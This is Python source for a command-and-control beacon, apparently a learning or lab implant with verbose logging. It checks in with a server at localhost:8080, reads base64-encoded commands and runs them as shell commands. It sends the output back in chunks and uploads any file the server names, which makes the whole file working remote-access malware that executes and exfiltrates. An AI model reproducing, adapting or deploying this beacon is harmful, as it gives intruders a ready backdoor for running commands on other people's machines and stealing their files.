import requests
import json
import secrets
import base64
import subprocess
import time
import logging
from os import path
from typing import Optional, Generator, Iterable


logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("ZombieBeacon")

class Zombie:
    def __init__(self):
        self.id = secrets.token_hex(10)
        self.host = "http://localhost:8080"
        self.sleep = 5
        self.proxy = {}
        self.token = ""
        logger.debug(f"Zombie initialized. ID: {self.id} | Target Host: {self.host}")

    def set_token(self, token: str):
        logger.debug(f"Updating session token to: {token[:5]}...")
        self.token = token

    def get_token(self) -> str: return self.token
    def set_sleep(self, t: str):
        self.sleep = int(t)
        logger.debug(f"Sleep interval updated to {self.sleep} seconds")

    def get_sleep(self) -> int: return self.sleep

    # Transport layer, handles actual sending
    # Accepts a chunks generator to itterate over for sending
    def _transmit(self, chunk_generator: Iterable[bytes], data_type: str, total_size: int) -> bool:
        logger.debug(f"Starting transmission of {total_size} total bytes")

        bytes_sent = 0

        for index, chunk in enumerate(chunk_generator):
            chunk_len = len(chunk)
            bytes_sent += chunk_len
            b64_data = base64.b64encode(chunk).decode('utf-8')

            # Determine if this is the final chunk based on actual bytes sent
            is_end = bytes_sent >= total_size

            payload = {
                "X-Client-ID": self.id,
                "Token": self.token,
                "type": f"{data_type}",
                "data": f"CHUNK_{index}:{b64_data}",
                "page": "END" if is_end else index + 1
            }

            try:
                resp = requests.post(f"{self.host}/sendto", json=payload, proxies=self.proxy, timeout=15)
                resp.raise_for_status()
            except requests.RequestException as e:
                logger.error(f"Transport Error at chunk {index}: {e}")
                return False

        return True

    def send_binary_data(self, data: bytes):
        # Sends arbitrary bytes (command output, etc) using the transport layer.
        data_len = len(data)
        logger.debug(f"Preparing binary data transmission: {data_len} bytes")

        def memory_chunker():
            for i in range(0, data_len, 50000):
                yield data[i : i + 50000]

        return self._transmit(memory_chunker(), "CMD", data_len)

    def upload_file(self, filename: str):
        # Streams a file from disk to the server.
        if not path.exists(filename):
            logger.error(f"File Upload Failed: {filename} does not exist on disk.")
            return False

        filesize = path.getsize(filename)
        logger.info(f"Initiating file upload: {filename} ({filesize} bytes)")

        # generator to gather chunks to send
        def file_chunker():
            with open(filename, 'rb') as f:
                while True:
                    chunk = f.read(50000)
                    if not chunk: break
                    yield chunk

        return self._transmit(file_chunker(), "FILE", filesize)

    def checkin(self):
        payload = {"X-Client-ID": self.id}
        try:
            logger.debug("Sending check-in request...")
            return requests.post(f"{self.host}/checkin", json=payload, proxies=self.proxy,
timeout=10, allow_redirects=False)
        except requests.RequestException as e:
            logger.error(f"Checkin failed to reach server: {e}")
            return None

    def get_data(self) -> Optional[str]:
        payload = {"X-Client-ID": self.id, "Token": self.token}
        try:
            logger.debug("Requesting pending data/commands from /recvFrom")
            resp = requests.get(f"{self.host}/recvFrom", json=payload, proxies=self.proxy,
timeout=10)
            resp.raise_for_status()
            data = resp.json().get('data')
            logger.debug(f"Data received from server. Length: {len(data) if data else 0}")
            return data
        except Exception as e:
            logger.error(f"Error retrieving data: {e}")
            return None

def process_data(command_str: str, zombie: Zombie):
    #Parses server commands and executes them.
    try:
        # Split only once to avoid errors with commands containing colons
        split = command_str.split(":", 1)
        action = split[0]

        if action == "CMD":
            cmd = split[1]
            logger.info(f"Executing Command: {cmd}")
            res = subprocess.run(cmd, capture_output=True, shell=True)

            # Combine stdout and stderr to capture full output
            combined_output = res.stdout + res.stderr
            payload = f"CMD:{cmd}:OUTPUT:".encode('utf-8') + combined_output

            logger.debug(f"Command execution finished. Output size: {len(combined_output)} bytes")
            zombie.send_binary_data(payload)

        elif action == "KILL":
            logger.warning("Kill signal received from server. Shutting down beacon.")
            exit()

        elif action == "FILE":
            filename = split[1]
            logger.info(f"Server requested file: {filename}")
            if zombie.upload_file(filename):
                logger.info(f"File {filename} uploaded successfully.")
            else:
                logger.error(f"Failed to upload file {filename}.")
        elif action == "SLEEP":
            try:
                zombie.set_sleep(int(split[1]))
            except Exception as e:
                logger.debug(f"Couldn't set sleep timer, value is: {split[1]}, type: {type(split[1])}, error: {e}")
        else:
            logger.warning(f"Received unrecognized action from server: {action}")
    except Exception as e:
        logger.exception(f"Critical error in process_data loop: {e}")

def main():
    zombie = Zombie()
    logger.info("Beacon started and entering main loop.")

    while True:
        req = zombie.checkin()

        if req is None:
            logger.debug("Server unreachable, retrying in 30s...")
            time.sleep(30)
            continue

        if req.status_code == 200:
            try:
                content = req.json()
                zombie.set_sleep(content.get('X-Server-Version', 5))
                logger.debug(f"No commands pending. Sleeping for {zombie.get_sleep()}s")
            except json.JSONDecodeError:
                logger.error("Server returned status 200 but invalid JSON body.")
            time.sleep(zombie.get_sleep())

        elif req.status_code == 302:
            logger.info("Redirect (302) received: Command is available.")
            # Extract metadata from headers
            zombie.set_token(req.headers.get('Token', ''))
            zombie.set_sleep(req.headers.get('X-Server-Version', 5))

            b64data = zombie.get_data()
            if b64data:
                try:
                    decoded_cmd = base64.b64decode(b64data).decode('utf-8')
                    logger.debug(f"Decoded command from server: {decoded_cmd}")
                    process_data(decoded_cmd, zombie)
                except Exception as e:
                    logger.error(f"Failed to decode/execute server command: {e}")
            else:
                logger.warning("Server signaled a 302 but /recvFrom returned no data.")

            time.sleep(zombie.get_sleep())
        else:
            logger.warning(f"Unexpected server response: HTTP {req.status_code}")
            time.sleep(zombie.get_sleep())

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Beacon stopped by user.")